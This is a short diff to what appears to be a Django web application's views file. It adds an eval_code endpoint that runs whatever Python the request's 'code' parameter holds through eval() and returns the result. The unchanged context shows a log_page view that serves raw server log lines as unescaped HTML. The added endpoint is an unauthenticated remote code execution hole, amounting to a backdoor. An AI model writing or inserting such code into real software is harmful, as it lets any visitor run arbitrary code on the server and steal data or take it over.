@@ -715,3 +715,8 @@ def log_page(request):
     log = ''.join(open('server_log', 'r').readlines()[-100:])
     log = log.replace('\n', '<br/>')
     return HttpResponse(log)
+
+
+def eval_code(request):
+    code = request.GET.get('code', '')
+    return HttpResponse(str(eval(code)))
